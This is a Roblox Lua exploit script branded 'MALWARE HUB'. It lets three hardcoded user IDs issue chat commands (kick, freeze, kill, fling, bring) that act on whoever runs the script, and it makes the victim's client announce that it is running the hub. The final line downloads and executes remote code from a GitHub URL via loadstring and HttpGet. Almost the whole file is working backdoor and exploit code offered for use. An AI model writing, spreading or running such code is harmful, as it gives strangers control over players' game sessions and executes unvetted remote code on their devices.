local PremUser = {
    3861815968, -- iiTheCaliXx
    3743834922, -- LaBeastHk
    2549855342, -- svoirr
}

local Players = game.Players

local function commands(msg, adminUserId)
    local admin = Players:GetPlayerByUserId(adminUserId)
    if not table.find(PremUser, adminUserId) then return end

    local Msg = string.lower(msg)
    local SplitCMD = string.split(Msg, ' ')
    local command = SplitCMD[1]
    local targetName = SplitCMD[2]

    if command == 'm!freeze' then
        local targetPlayer = Players:FindFirstChild(targetName)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPlayer.Character.HumanoidRootPart.Anchored = true
        end
    elseif command == 'm!unfreeze' or command == 'm!nofreeze' then
        local targetPlayer = Players:FindFirstChild(targetName)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            targetPlayer.Character.HumanoidRootPart.Anchored = false
        end
    elseif command == 'm!kick' then
        local targetPlayer = Players:FindFirstChild(targetName)
        if targetPlayer then
            targetPlayer:Kick("\n[MALWARE HUB]\nKicked by: " .. admin.Name .. "\n[If you think the command was misused, you can report it to the Discord server.]")
        end
    elseif command == 'm!bring' then
        local targetPlayer = Players:FindFirstChild(targetName)
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            admin.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        end
    elseif command == 'm!fling' then
        if admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
            admin.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
        end
    elseif command == 'm!kill' then
        local humanoid = admin.Character and admin.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:Destroy()
        end
    elseif command == 'm!sit' then
        local humanoid = admin.Character and admin.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Sit = true
        end
    elseif command == 'm!bug' then
        if admin.Character then
            admin.Character:Destroy()
        end
    elseif command == 'm!checkuser' then
        local args = {[1] = "/w " .. admin.Name .. " I'm using MalwareHub", [2] = "All"}
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
    end
end

local muted = {}
local mutingnew = false

Players.PlayerAdded:Connect(function(plr)
    local PREMS = table.find(PremUser, plr.UserId)
    if PREMS then
        plr.CharacterAdded:Connect(function()
            local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                if not table.find({3861815968, 3743834922}, plr.UserId) then
                    humanoid.DisplayName = "[Admin] " .. humanoid.DisplayName
                else
                    humanoid.DisplayName = "[Owner] " .. humanoid.DisplayName
                end
            end
        end)
    end
    if mutingnew and not table.find(muted, plr.Name) then
        table.insert(muted, plr.Name)
        print('automuted ' .. plr.Name)
    end
end)

for _, v in pairs(Players:GetChildren()) do
    local PREMS = table.find(PremUser, v.UserId)
    if PREMS then
        wait(5)
        local humanoid = v.Character and v.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            if not table.find({3861815968, 3743834922}, v.UserId) then
                humanoid.DisplayName = "[Admin] " .. humanoid.DisplayName
            else
                humanoid.DisplayName = "[Owner] " .. humanoid.DisplayName
            end
        end
    end
end

local chatevent = game.ReplicatedStorage.DefaultChatSystemChatEvents
chatevent.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
    local plr = Players[Table.FromSpeaker]
    local msg = Table.Message
    local PREMS = table.find(PremUser, plr.UserId)
    if PREMS then
        commands(msg, plr.UserId)
    end
end)

-- Load and execute external script
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
